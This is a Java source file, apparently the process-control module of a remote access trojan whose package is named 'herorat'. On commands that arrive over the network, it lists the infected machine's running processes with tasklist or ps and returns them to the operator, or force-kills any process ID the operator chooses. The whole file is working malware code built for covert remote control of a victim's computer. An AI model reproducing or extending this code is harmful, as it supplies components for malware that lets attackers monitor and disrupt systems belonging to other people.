package net.herorat.features.process;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;

import net.herorat.network.Packet;
import net.herorat.network.Packet9Process;


public class Process
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 2 && args[0].equals("kill"))
		{
			if (kill(Integer.parseInt(args[1])))
			{
				p = new Packet9Process(outputstream, new String[] { "SUCCESS" });
				p.write();
			}
			else
			{
				p = new Packet9Process(outputstream, new String[] { "ERROR" });
				p.write();
			}
		}
		else if (args.length == 1 && args[0].equals("get"))
		{
			p = new Packet9Process(outputstream, new String[] { getProcess() });
			p.write();
		}
		else
		{
			p = new Packet9Process(outputstream, new String[] { "ERROR" });
			p.write();
		}
	}

	public static String getProcess()
	{
		try
		{	
			java.lang.Process cmd;
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win")) cmd = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
			else cmd = Runtime.getRuntime().exec("ps -e");
			
			String process_list = "";
			String line;
			int line_count = 0;
			BufferedReader input = new BufferedReader(new InputStreamReader(cmd.getInputStream()));
			while ((line = input.readLine()) != null)
			{
				ArrayList<String> valid_values = new ArrayList<String>();
				
				if (!process_list.equals("")) process_list += "###";
				if (os.contains("win"))
				{
					String[] splitted_line = line.split("  ");
					for (int i=0; i<splitted_line.length; i++)
					{
						splitted_line[i] = splitted_line[i].trim();
						if (splitted_line[i].length() > 0) valid_values.add(splitted_line[i]);
					}
					if (line_count++ < 3) continue;
					process_list += valid_values.get(0) + ";" + valid_values.get(1).split(" ")[0] + ";" + valid_values.get(1).split(" ")[1] + ";" + valid_values.get(3);
				}
				else if (os.contains("nux"))
				{
					String[] splitted_line = line.split(" ");
					for (int i=0; i<splitted_line.length; i++)
					{
						splitted_line[i] = splitted_line[i].trim();
						if (splitted_line[i].length() > 0) valid_values.add(splitted_line[i]);
					}
					process_list += valid_values.get(valid_values.size() - 1) + ";" + valid_values.get(1) + ";" + valid_values.get(0) + ";" + valid_values.get(3);
				}
				else if (os.contains("mac"))
				{
					String[] splitted_line = line.split(" ");
					for (int i=0; i<splitted_line.length; i++)
					{
						splitted_line[i] = splitted_line[i].trim();
						if (splitted_line[i].length() > 0) valid_values.add(splitted_line[i]);
					}
					process_list += valid_values.get(valid_values.size() - 1) + ";" + valid_values.get(1) + ";" + valid_values.get(0) + ";" + valid_values.get(3);
				}
			}
			input.close();
			
			return process_list;
		}
		catch (Exception e) {e.printStackTrace();}
		
		return "";
	}
	
	public static boolean kill(int pid)
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win")) Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tskill.exe " + pid);
			else Runtime.getRuntime().exec(new String[] { "kill", "-9", String.valueOf(pid) });
			
			return true;
		}
		catch (Exception e) {}
		
		return false;
	}
}